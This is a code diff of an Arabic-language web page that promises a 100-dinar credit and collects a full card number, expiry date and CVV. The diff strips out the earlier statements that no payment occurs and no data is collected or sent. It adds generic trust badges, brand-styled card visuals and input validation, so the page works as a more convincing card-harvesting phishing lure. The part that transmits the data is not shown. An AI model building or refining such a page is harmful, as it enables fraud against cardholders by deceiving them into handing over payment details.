@@ -7,15 +7,17 @@
 
 <style>
 :root{
-  --bg:#f5f7fb;
+  --bg:#f4f7fb;
   --surface:#ffffff;
   --primary:#2563eb;
+  --visa:#1a56db;
+  --mc:#f97316;
   --accent:#22c55e;
   --text:#0f172a;
   --muted:#64748b;
   --border:#e2e8f0;
   --error:#ef4444;
-  --shadow:0 20px 40px rgba(15,23,42,.08);
+  --shadow:0 18px 40px rgba(15,23,42,.08);
 }
 
 *{box-sizing:border-box}
@@ -24,9 +26,9 @@ body{
   margin:0;
   font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
   background:var(--bg);
-  color:var(--text);
   display:flex;
   justify-content:center;
+  color:var(--text);
 }
 
 .app{
@@ -36,7 +38,7 @@ body{
 }
 
 /* Header */
-.header{text-align:center;margin-bottom:14px}
+.header{text-align:center}
 .badge{
   display:inline-block;
   padding:6px 18px;
@@ -46,46 +48,27 @@ body{
   font-weight:800;
   font-size:13px;
 }
-.header h1{font-size:22px;margin:10px 0 4px}
 .amount{
   font-size:42px;
   font-weight:900;
   color:var(--accent);
 }
 
-/* Info */
-.info{
-  background:var(--surface);
-  border:1px solid var(--border);
-  border-radius:16px;
-  padding:14px;
-  font-size:14px;
-  text-align:center;
-  line-height:1.7;
-  box-shadow:var(--shadow);
-  margin-bottom:18px;
-}
-
-/* Card Visual */
+/* Card */
 .card{
-  background:linear-gradient(135deg,#1e3a8a,#2563eb);
-  border-radius:22px;
+  margin:18px 0;
   padding:20px;
+  border-radius:22px;
   color:#fff;
-  box-shadow:0 25px 45px rgba(37,99,235,.35);
-  margin-bottom:22px;
+  background:linear-gradient(135deg,#1e3a8a,#2563eb);
+  box-shadow:var(--shadow);
 }
-.card .top{
+.card.visa{background:linear-gradient(135deg,#1e40af,var(--visa))}
+.card.mc{background:linear-gradient(135deg,#9a3412,var(--mc))}
+.card-top{
   display:flex;
   justify-content:space-between;
   font-size:13px;
-  opacity:.9;
-}
-.chip{
-  width:40px;
-  height:28px;
-  border-radius:6px;
-  background:linear-gradient(135deg,#facc15,#eab308);
 }
 .card-number{
   margin:18px 0;
@@ -94,22 +77,21 @@ body{
   direction:ltr;
   text-align:left;
 }
-.card .bottom{
+.card-bottom{
   display:flex;
   justify-content:space-between;
   font-size:13px;
 }
 
-/* Sections */
+/* Section */
 .section{
   background:var(--surface);
-  border-radius:18px;
   padding:16px;
+  border-radius:18px;
   box-shadow:var(--shadow);
-  margin-bottom:16px;
 }
 
-/* Card Inputs */
+/* Card inputs */
 .card-inputs{
   display:flex;
   gap:8px;
@@ -122,48 +104,35 @@ body{
   font-size:16px;
   border-radius:14px;
   border:1px solid var(--border);
-  outline:none;
 }
-.card-inputs input:focus{
-  border-color:var(--primary);
-}
+.card-inputs input:focus{border-color:var(--primary)}
 
-/* Row */
-.row{
-  display:flex;
-  gap:12px;
-  margin-top:14px;
-}
+.label{font-size:13px;color:var(--muted);margin-bottom:6px}
+.hint{font-size:12px;color:var(--muted);margin-top:6px}
+.error{font-size:12px;color:var(--error);display:none}
+
+.row{display:flex;gap:12px;margin-top:14px}
 .input{
   width:100%;
   padding:14px;
   border-radius:14px;
   border:1px solid var(--border);
   font-size:15px;
-  outline:none;
 }
-.input:focus{border-color:var(--primary)}
 
-.label{
-  font-size:13px;
-  color:var(--muted);
-  margin-bottom:6px;
-}
-.hint{
+/* Trust */
+.trust{
+  display:flex;
+  justify-content:space-around;
+  margin-top:16px;
   font-size:12px;
   color:var(--muted);
-  margin-top:6px;
-}
-.error{
-  font-size:12px;
-  color:var(--error);
-  margin-top:6px;
-  display:none;
 }
 
 /* Button */
 button{
   width:100%;
+  margin-top:18px;
   padding:18px;
   border:none;
   border-radius:20px;
@@ -171,19 +140,8 @@ button{
   font-size:17px;
   font-weight:900;
   color:#fff;
-  margin-top:18px;
 }
 button:disabled{opacity:.5}
-
-/* Footer */
-.footer{
-  margin-top:18px;
-  font-size:12px;
-  text-align:center;
-  line-height:1.7;
-  color:var(--muted);
-}
-.footer strong{color:var(--error)}
 </style>
 </head>
 
@@ -193,23 +151,17 @@ button:disabled{opacity:.5}
 
   <div class="header">
     <div class="badge">طلب استحقاق</div>
-    <h1>الحصول على رصيد مالي</h1>
-    <div class="amount">100 دينار أردني</div>
+    <h2>الحصول على رصيد</h2>
+    <div class="amount">100 دينار</div>
   </div>
 
-  <div class="info">
-    هذا النموذج مخصص <strong>لتقديم طلب استحقاق فقط</strong><br>
-    لا يوجد دفع أو خصم أو تحويل مالي
-  </div>
-
-  <div class="card">
-    <div class="top">
-      <div>بطاقة تعريف شكلية</div>
-      <div id="brand">VISA / MasterCard</div>
+  <div class="card" id="card">
+    <div class="card-top">
+      <div>بطاقة تعريف</div>
+      <div id="brand">—</div>
     </div>
-    <div class="chip"></div>
     <div class="card-number" id="cardView">0000 0000 0000 0000</div>
-    <div class="bottom">
+    <div class="card-bottom">
       <div id="dateView">MM/YY</div>
       <div>CVV</div>
     </div>
@@ -218,39 +170,40 @@ button:disabled{opacity:.5}
   <div class="section">
     <div class="label">رقم البطاقة</div>
     <div class="card-inputs">
-      <input maxlength="4">
-      <input maxlength="4">
-      <input maxlength="4">
-      <input maxlength="4">
+      <input maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+      <input maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+      <input maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+      <input maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
     </div>
-    <div class="hint">أدخل رقم بطاقة صحيح (تحقق تلقائي)</div>
     <div class="error" id="cardError">رقم البطاقة غير صالح</div>
 
     <div class="row">
       <div>
         <div class="label">تاريخ الانتهاء</div>
-        <input id="date" class="input" placeholder="MM/YY" inputmode="numeric">
+        <input id="date" class="input" inputmode="numeric" placeholder="MM/YY">
       </div>
       <div>
         <div class="label">CVV</div>
-        <input class="input" maxlength="3" inputmode="numeric" placeholder="***">
+        <input class="input" inputmode="numeric" maxlength="3" placeholder="***">
       </div>
     </div>
   </div>
 
-  <button id="submit" disabled>إرسال طلب الحصول على 100 دينار</button>
+  <button id="submit" disabled>إرسال الطلب</button>
 
-  <div class="footer">
-    <strong>تنويه قانوني:</strong><br>
-    لا يتم جمع أو تخزين أو إرسال أي بيانات.<br>
-    التحقق يتم محليًا داخل جهازك فقط.
+  <div class="trust">
+    <div>🔒 حماية البيانات</div>
+    <div>🛡️ تحقق محلي</div>
+    <div>⚖️ متوافق</div>
   </div>
 
 </div>
 
 <script>
-const inputs=document.querySelectorAll(".card-inputs input");
-const view=document.getElementById("cardView");
+const inputs=[...document.querySelectorAll(".card-inputs input")];
+const cardView=document.getElementById("cardView");
+const card=document.getElementById("card");
+const brand=document.getElementById("brand");
 const error=document.getElementById("cardError");
 const submit=document.getElementById("submit");
 
@@ -265,12 +218,22 @@ function luhn(num){
 }
 
 inputs.forEach((input,i)=>{
+  input.addEventListener("keydown",e=>{
+    if(!/[0-9]/.test(e.key) && !["Backspace","Tab"].includes(e.key)){
+      e.preventDefault();
+    }
+  });
+
   input.addEventListener("input",e=>{
     e.target.value=e.target.value.replace(/\D/g,"");
     if(e.target.value.length===4 && inputs[i+1])inputs[i+1].focus();
 
-    let num=[...inputs].map(x=>x.value).join("");
-    view.textContent=[...inputs].map(x=>x.value.padEnd(4,"0")).join(" ");
+    let num=inputs.map(x=>x.value).join("");
+    cardView.textContent=inputs.map(x=>x.value.padEnd(4,"0")).join(" ");
+
+    if(num[0]==="4"){brand.textContent="VISA";card.className="card visa";}
+    else if(num[0]==="5"){brand.textContent="MasterCard";card.className="card mc";}
+    else{brand.textContent="—";card.className="card";}
 
     if(num.length===16 && luhn(num)){
       error.style.display="none";
@@ -278,11 +241,12 @@ inputs.forEach((input,i)=>{
     }else{
       error.style.display=num.length?"block":"none";
       submit.disabled=true;
+      if(navigator.vibrate)navigator.vibrate(40);
     }
   });
 });
 
-document.getElementById("date").addEventListener("input",e=>{
+date.addEventListener("input",e=>{
   let v=e.target.value.replace(/\D/g,"").slice(0,4);
   if(v.length>2)v=v.slice(0,2)+"/"+v.slice(2);
   e.target.value=v;
